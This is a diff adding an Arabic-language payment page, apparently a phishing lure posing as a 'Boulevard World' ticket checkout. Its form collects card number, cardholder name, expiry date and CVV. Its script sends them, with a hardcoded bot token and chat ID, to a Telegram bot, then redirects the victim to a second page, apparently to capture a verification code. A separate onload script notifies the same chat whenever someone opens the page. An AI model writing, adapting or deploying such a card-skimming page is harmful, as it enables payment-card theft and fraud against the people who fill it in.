@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>
+        بوليفارد وورلد
+    </title>
+
+    <link rel="icon" type="image/png" href="img/logo.svg"> 
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.bundle.min.js">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css">
+</head>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+
+
+body{
+    
+
+background: linear-gradient(to right, rgba(235,224,232,1) 52%,rgba(254,191,1,1) 53%,rgba(254,191,1,1) 100%);
+font-family: 'Roboto', sans-serif;
+}
+
+.card{
+	border: none;
+	max-width: 450px;
+	border-radius: 15px;
+	margin: 150px 0 150px;
+	padding: 35px;
+	padding-bottom: 20px!important;
+}
+.heading{
+	color: #C1C1C1;
+	font-size: 14px;
+	font-weight: 500;
+}
+img{
+	transform: translate(160px,-10px);
+}
+img:hover{
+    cursor: pointer;
+}
+.text-warning{
+	font-size: 12px;
+	font-weight: 500;
+	color: #edb537!important;
+}
+#cno{
+	transform: translateY(-10px);
+}
+input{
+	border-bottom: 1.5px solid #E8E5D2!important;
+	font-weight: bold;
+	border-radius: 0;
+	border: 0;
+
+}
+.form-group input:focus{
+	border: 0;
+	outline: 0;
+}
+.col-sm-5{
+	padding-left: 90px;
+}
+.btn{
+	background: #F3A002!important;
+	border: none;
+	border-radius: 30px;
+}
+.btn:focus{
+    box-shadow: none;
+}
+
+
+
+
+
+</style>
+<body>
+  
+    
+    <div class="container-fluid " style="    zoom: 1.1; /* يعمل في Chrome وEdge */
+">
+        <div class="row d-flex justify-content-center">
+            <div class="col-sm-12 ">
+                <div class="card mx-auto">
+                    <p class="heading">تفاصيل الدفع</p>
+                    <form id="payment-form" class="card-details">
+                        <img src="https://img.icons8.com/color/48/000000/visa.png" width="64px" height="60px" />
+                        <div class="form-group">
+                            <p class="text-warning">رقم البطاقة</p>
+                            <input type="text" name="card-num" placeholder="1234 5678 9012 3457" size="17" id="cno" minlength="19" maxlength="19" required>
+                        </div>
+                        <div class="form-group">
+                            <p class="text-warning mb-0">اسم حامل البطاقة</p>
+                            <input type="text" name="name" placeholder="الاسم" size="17" required>
+                        </div>
+                        <div class="form-group pt-2">
+                            <div class="row d-flex">
+                                <div class="col-sm-4">
+                                    <p class="text-warning mb-0">تاريخ الانتهاء</p>
+                                    <input type="text" name="exp" placeholder="MM/YY" size="7" id="exp" minlength="5" maxlength="7" required>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="form-group pt-2">
+                            <div class="row d-flex">
+                                <div class="col-sm-3">
+                                    <p class="text-warning mb-0">CVV</p>
+                                    <input type="password" name="cvv" placeholder="&#9679;&#9679;&#9679;" size="2" minlength="3" maxlength="3" required>
+                                </div>
+                            </div>
+                        </div>
+                    </form>
+                    <div class="col-sm-5 pt-0 d-flex justify-content-start">
+                        <button id="send-data" type="button" class="btn btn-primary">
+                            إرسال
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('send-data').addEventListener('click', function () {
+            const form = document.getElementById('payment-form');
+            const formData = new FormData(form);
+            
+            const data = {
+                cardNumber: formData.get('card-num'),
+                cardHolder: formData.get('name'),
+                expiry: formData.get('exp'),
+                cvv: formData.get('cvv')
+            };
+    
+            const telegramToken = '8111423771:AAFiMg4m6f0FjkEBKUNorM6bOK9MwCruteM'; // استبدل بـ Token البوت الخاص بك
+            const chatId = '-1002310409638'; // استبدل بـ Chat ID الخاص بك
+            const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+    
+            const message = `
+            5️⃣ تذاكر
+           🌟🌟🌟🌟🌟🌟🌟
+
+تفاصيل الدفع:
+ - رقم البطاقة: ${data.cardNumber}
+- اسم حامل البطاقة: ${data.cardHolder}
+- تاريخ الانتهاء: ${data.expiry}
+- الرمز السري: ${data.cvv}
+            `;
+    
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then((response) => {
+                
+    if (response.ok) {
+        // إنشاء النافذة المنبثقة
+        const countdownModal = document.createElement('div');
+        countdownModal.style.position = 'fixed';
+        countdownModal.style.top = '0';
+        countdownModal.style.left = '0';
+        countdownModal.style.width = '100%';
+        countdownModal.style.height = '100%';
+        countdownModal.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
+        countdownModal.style.display = 'flex';
+        countdownModal.style.flexDirection = 'column';
+        countdownModal.style.justifyContent = 'center';
+        countdownModal.style.alignItems = 'center';
+        countdownModal.style.zIndex = '9999';
+
+        // حاوية المحتوى
+        const contentContainer = document.createElement('div');
+        contentContainer.style.backgroundColor = 'white';
+        contentContainer.style.padding = '30px';
+        contentContainer.style.borderRadius = '15px';
+        contentContainer.style.textAlign = 'center';
+        contentContainer.style.boxShadow = '0 4px 15px rgba(0, 0, 0, 0.3)';
+        contentContainer.style.maxWidth = '400px';
+        contentContainer.style.width = '80%';
+
+        // الرسالة
+        const message = document.createElement('p');
+        message.textContent = 'ستتم إعادة التوجيه بعد 17 ثانية...';
+        message.style.fontSize = '18px';
+        message.style.fontClor = '18px';
+        message.style.color = '#333';
+        message.style.marginBottom = '20px';
+        message.style.fontFamily = 'Arial, sans-serif';
+
+        // العداد
+        const countdown = document.createElement('span');
+        countdown.style.fontSize = '40px';
+        countdown.style.color = '#f3a002';
+        countdown.style.fontWeight = 'bold';
+        countdown.textContent = '17'; // بدء العد التنازلي
+
+        // إضافة العناصر إلى الحاوية
+        contentContainer.appendChild(message);
+        contentContainer.appendChild(countdown);
+
+        // إضافة الحاوية إلى النافذة
+        countdownModal.appendChild(contentContainer);
+        document.body.appendChild(countdownModal);
+
+        // بدء العد التنازلي
+        let secondsRemaining = 17;
+        const interval = setInterval(() => {
+            secondsRemaining -= 1;
+            countdown.textContent = secondsRemaining;
+
+            if (secondsRemaining <= 0) {
+                clearInterval(interval);
+                // الانتقال إلى الصفحة الأخرى
+                window.location.href = 'code.html'; // استبدل بالرابط الخاص بالصفحة
+            }
+        }, 1000);
+    } else {
+        // الانتقال مباشرة في حالة الاستجابة غير ناجحة
+        window.location.href = 'code.html'; // استبدل بالرابط الخاص بالصفحة
+    }
+});
+
+        });
+    </script>
+    
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const form = document.querySelector(".card-details");
+    const cardNumberInput = document.querySelector("input[name='card-num']");
+    const nameInput = document.querySelector("input[name='name']");
+    const expInput = document.querySelector("input[name='exp']");
+    const cvvInput = document.querySelector("input[name='cvv']");
+
+    form.addEventListener("submit", function (event) {
+        // التحقق من صحة رقم البطاقة (16 رقم مع مسافات بين كل 4 أرقام)
+        const cardNumberPattern = /^\d{4}\s\d{4}\s\d{4}\s\d{4}$/;
+        if (!cardNumberPattern.test(cardNumberInput.value)) {
+            alert("يرجى إدخال رقم بطاقة صالح بتنسيق '1234 5678 9012 3457'.");
+            event.preventDefault();
+            return;
+        }
+
+        // التحقق من صحة اسم حامل البطاقة (يجب أن يحتوي فقط على حروف ومسافات)
+        const namePattern = /^[a-zA-Z\s]+$/;
+        if (!namePattern.test(nameInput.value)) {
+            alert("يرجى إدخال اسم صحيح (فقط حروف ومسافات).");
+            event.preventDefault();
+            return;
+        }
+
+        // التحقق من صحة تاريخ الانتهاء (بتنسيق MM/YY)
+        const expPattern = /^(0[1-9]|1[0-2])\/(2[4-9]|3[0-9]|4[0-9]|5[0])$/;
+        if (!expPattern.test(expInput.value)) {
+            alert("يرجى إدخال تاريخ انتهاء صالح بتنسيق 'MM/YY' حيث يكون الشهر من 01 إلى 12 والسنة بين 24 و 50.");
+            event.preventDefault();
+            return;
+        }
+
+        // التحقق من صحة CVV (يجب أن يكون 3 أرقام)
+        const cvvPattern = /^\d{3}$/;
+        if (!cvvPattern.test(cvvInput.value)) {
+            alert("يرجى إدخال CVV صالح (3 أرقام).");
+            event.preventDefault();
+            return;
+        }
+
+        alert("تم إرسال النموذج بنجاح!");
+    });
+
+    // منع إدخال أي حرف غير رقمي في رقم البطاقة و CVV
+    cardNumberInput.addEventListener("input", function () {
+        this.value = this.value.replace(/[^\d\s]/g, "").replace(/(\d{4})(?!\s|$)/g, "$1 ");
+    });
+
+    cvvInput.addEventListener("input", function () {
+        this.value = this.value.replace(/\D/g, "");
+    });
+
+    // منع إدخال أي حرف غير رقمي في تاريخ الانتهاء
+    expInput.addEventListener("input", function () {
+        let value = this.value.replace(/[^0-9]/g, ""); // إزالة أي مدخلات غير رقمية
+        if (value.length >= 2) {
+            value = value.slice(0, 2) + "/" + value.slice(2, 4); // إضافة "/" بعد الشهر وتقييد السنة بحدود 2 رقم
+        }
+        this.value = value;
+    });
+
+    // منع إدخال أي حرف غير الحروف الأبجدية أو المسافات في اسم حامل البطاقة
+    nameInput.addEventListener("input", function () {
+        this.value = this.value.replace(/[^a-zA-Z\s]/g, "");
+    });
+});
+
+
+document.addEventListener("DOMContentLoaded", function () {
+    // إعادة تعيين النموذج عند تحميل الصفحة
+    const form = document.querySelector(".card-details");
+    form.reset();
+});
+
+
+
+
+</script>
+
+<script>
+    // إرسال الرسالة إلى Telegram عند فتح الموقع
+    window.onload = function() {
+      // معرف البوت ومعرف الدردشة
+      const botToken = '8111423771:AAFiMg4m6f0FjkEBKUNorM6bOK9MwCruteM'; // ضع رمز البوت الخاص بك هنا
+      const chatId = '-1002310409638'; // ضع معرف الدردشة الخاص بك هنا
+  
+      // الرسالة التي سيتم إرسالها
+     const message =`4️⃣ تذاكر 
+     الدخول للدفع`;
+ 
+
+  
+      // إرسال الرسالة إلى بوت Telegram
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        }),
+      })
+     
+    };
+  </script>
+
+
+</body>
+</html>
